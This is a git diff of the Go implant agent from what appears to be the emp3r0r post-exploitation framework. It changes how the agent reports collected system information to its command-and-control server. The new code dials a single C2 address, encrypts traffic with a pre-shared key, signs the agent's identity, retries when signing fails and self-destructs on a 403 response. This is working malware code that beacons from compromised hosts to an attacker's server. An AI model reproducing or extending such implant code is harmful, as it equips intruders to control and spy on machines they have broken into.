@@ -12,12 +12,11 @@ import (
 	"time"
 
 	"github.com/fxamacker/cbor/v2"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
-	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 
 	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/preflight"
@@ -26,21 +25,12 @@ import (
 
 // ReportStatus poll CC server and report its system info
 func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
-	prefix := config.C2Prefix
-	if prefix == "" {
-		prefix = transport.WebRoot
-	}
-	checkinPath := config.CheckInPath
-	if checkinPath == "" {
-		checkinPath = "checkin"
-	}
-	// If UUID is valid, use it.
-	// If empty, the checkin will fail with 404 because the URL will be incomplete (/api/checkin/),
-	// or the server will reject it. This is intended.
-	reportStatusURL := netutil.JoinURL(def.CCAddress, prefix, checkinPath, info.UUID)
-	logging.Infof("Collected system info, now reporting status (%s)", reportStatusURL)
+	// The C2 protocol is transport-agnostic: routing is done by MsgAuth.Capabilities
+	// inside the CBOR frame — not by URL path. We dial the single C2 endpoint.
+	reportStatusURL := def.CCAddress
+	logging.Infof("Collected system info, now reporting status to %s", reportStatusURL)
 
-	conn, _, _, err := EstablishC2Connection(reportStatusURL)
+	conn, _, _, err := EstablishC2Connection(reportStatusURL, "", common.RuntimeConfig.C2Routes.Checkin)
 	if err != nil {
 		if strings.Contains(err.Error(), "bad status code: 403") {
 			return fmt.Errorf("self-destruct")
@@ -49,7 +39,9 @@ func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
 	}
 	defer conn.Close()
 
-	// Global Encryption: Wrap connection
+	// Global Encryption: Wrap connection with PSK
+	// Note: EstablishC2Connection already wraps with SecureConn before sending MsgAuth.
+	// Here we need a fresh SecureConn for the agent data payload that follows.
 	secureConn := transport.NewSecureConn(conn)
 
 	out := cbor.NewEncoder(secureConn)
@@ -235,10 +227,10 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 			sig, err := agentutils.SignWithAgentKey([]byte(config.AgentUUID))
 			if err != nil {
 				logging.Errorf("SignWithAgentKey: %v", err)
-				hello_msg.AgentUUIDSig = config.AgentUUIDSig // Fallback (will likely fail auth)
-			} else {
-				hello_msg.AgentUUIDSig = base64.URLEncoding.EncodeToString(sig)
+				util.TakeABlink()
+				continue
 			}
+			hello_msg.AgentUUIDSig = base64.URLEncoding.EncodeToString(sig)
 			if encodeErr := out.Encode(hello_msg); encodeErr != nil {
 				logging.Errorf("agent cannot connect to cc: %v", encodeErr)
 				util.TakeABlink()
